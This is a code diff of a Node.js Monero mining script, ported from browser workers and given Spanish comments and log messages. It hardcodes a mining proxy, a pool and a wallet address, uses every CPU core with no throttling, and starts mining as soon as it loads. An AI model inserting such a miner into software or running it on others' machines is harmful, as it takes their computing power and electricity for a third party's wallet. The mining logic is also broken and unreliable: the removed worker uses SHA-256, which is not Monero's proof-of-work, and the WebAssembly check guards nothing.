@@ -1,17 +1,24 @@
-const os = require('os'); // Importa el módulo 'os'
+const os = require('os');
+const { Worker } = require('worker_threads');
+const WebSocket = require('ws');
 
-// Optimized mining script based on original Monero miner
-let server = "wss://ny1.xmrminingproxy.com";
-let pool = "moneroocean.stream";
-let walletAddress = "45EziBvf7gEAkCE2C39FWNXprx7FbnkbGEi3eGGdpQbzKdVUGjLcDPLK4V9ZvMxFkWKpfpPD2e3srVg6WhuzvYnXFvNhhPJ";
-let workerId = "PRUEBA";
-let threads = os.cpus().length || -1; // Use all cores by default
-let throttleMiner = 0; // Throttle value in percentage (0 = max utilization)
-let workers = [], ws, totalHashes = 0, connected = false, job = null, reconnectAttempts = 0;
+// Configuración inicial
+const server = "wss://ny1.xmrminingproxy.com";
+const pool = "moneroocean.stream";
+const walletAddress = "45EziBvf7gEAkCE2C39FWNXprx7FbnkbGEi3eGGdpQbzKdVUGjLcDPLK4V9ZvMxFkWKpfpPD2e3srVg6WhuzvYnXFvNhhPJ";
+const workerId = "PRUEBA";
+const threads = os.cpus().length; // Usa todos los núcleos disponibles
+const throttleMiner = 0; // Configura la reducción (0 = uso máximo)
 const maxReconnectAttempts = 10;
 
+let workers = [];
+let ws;
+let totalHashes = 0;
+let connected = false;
+let job = null;
+let reconnectAttempts = 0;
 
-
+// Verifica si WebAssembly está soportado
 const wasmSupported = (() => {
   try {
     if (typeof WebAssembly === "object" && typeof WebAssembly.instantiate === "function") {
@@ -24,109 +31,100 @@ const wasmSupported = (() => {
   return false;
 })();
 
+// Conectar al pool
 function connectToPool() {
   if (connected || reconnectAttempts >= maxReconnectAttempts) {
     if (reconnectAttempts >= maxReconnectAttempts) {
-      console.error("Max reconnection attempts reached. Stopping reconnection.");
+      console.error("Se alcanzaron los intentos máximos de reconexión. Deteniendo reconexiones.");
     }
     return;
   }
+
   ws = new WebSocket(server);
+
   ws.onopen = () => {
     connected = true;
-    reconnectAttempts = 0; // Reset reconnect attempts on successful connection
+    reconnectAttempts = 0;
     ws.send(JSON.stringify({
       identifier: "handshake",
       pool,
       login: walletAddress,
-      password: "", // Optional
+      password: "",
       workerId,
       version: 7
     }));
-    console.log("Connected to pool");
+    console.log("Conectado al pool");
   };
 
   ws.onmessage = (message) => {
     try {
       const data = JSON.parse(message.data);
       if (data.identifier === "job") {
-        console.log("New mining job received:", data);
+        console.log("Nuevo trabajo recibido:", data);
         job = data;
         assignWorkToWorkers();
-      } else {
-        console.warn("Unhandled message type:", data);
       }
     } catch (error) {
-      console.error("Error parsing message:", error);
+      console.error("Error al procesar el mensaje:", error);
     }
   };
 
   ws.onclose = () => {
     connected = false;
     reconnectAttempts++;
-    const delay = Math.min(1000 * reconnectAttempts, 30000); // Exponential backoff, max 30s
-    console.log(`Disconnected from pool. Reconnecting in ${delay / 1000}s (attempt ${reconnectAttempts}/${maxReconnectAttempts})...`);
+    const delay = Math.min(1000 * reconnectAttempts, 30000);
+    console.log(`Desconectado del pool. Reconectando en ${delay / 1000}s...`);
     setTimeout(connectToPool, delay);
   };
 
   ws.onerror = (err) => {
-    console.error("WebSocket error:", err);
+    console.error("Error en WebSocket:", err);
     ws.close();
   };
 }
 
+// Crear un worker
 function createWorker() {
-  const worker = new Worker(URL.createObjectURL(new Blob([`(${workerScript.toString()})();`], { type: "application/javascript" })));
-  worker.onmessage = (e) => {
+  const worker = new Worker(__dirname + '/worker.js', { workerData: { throttle: throttleMiner } });
+
+  worker.on('message', (message) => {
     if (connected && ws && job) {
       try {
         ws.send(JSON.stringify({
           type: "submit",
-          result: e.data.hash,
-          job_id: job.job_id
+          result: message.hash,
+          job_id: message.job_id
         }));
         totalHashes++;
       } catch (error) {
-        console.error("Error sending hash:", error);
+        console.error("Error al enviar el hash:", error);
       }
     }
-  };
+  });
+
   workers.push(worker);
 }
 
+// Asignar trabajo a los workers
 function assignWorkToWorkers() {
   if (!job) return;
-  console.log(`Assigning job to workers: job_id=${job.job_id}, target=${job.target}`);
   workers.forEach(worker => worker.postMessage(job));
 }
 
-function startMining(customPool, customWallet, customWorkerId, customThreads, customThrottle) {
+// Iniciar minería
+function startMining() {
   if (!wasmSupported) {
-    console.error("WebAssembly not supported. Mining cannot proceed.");
+    console.error("WebAssembly no soportado. No se puede proceder.");
     return;
   }
-  // Apply custom parameters if provided
-  if (customPool) pool = customPool;
-  if (customWallet) walletAddress = customWallet;
-  if (customWorkerId) workerId = customWorkerId;
-  if (customThreads >= 0) threads = customThreads;
-  if (customThrottle >= 0) throttleMiner = customThrottle;
 
-  while (workers.length < threads || (threads < 0 && workers.length < os.cpus().length)) {
+  while (workers.length < threads) {
     createWorker();
   }
+
   connectToPool();
-  console.log(`Started mining with ${workers.length} workers and throttle set to ${throttleMiner}%.`);
+  console.log(`Minería iniciada con ${workers.length} workers.`);
 }
 
-function workerScript() {
-  onmessage = function (job) {
-    const { job_id, data } = job.data;
-    const throttleDelay = Math.max(0, (throttleMiner / 100) * 100); // Calculate delay based on throttle
-    setTimeout(() => {
-      crypto.subtle.digest("SHA-256", new TextEncoder().encode(data)).then(buffer => {
-        postMessage({ hash: buffer, job_id });
-      });
-    }, throttleDelay);
-  };
-}
+// Ejecutar minería automáticamente
+startMining();
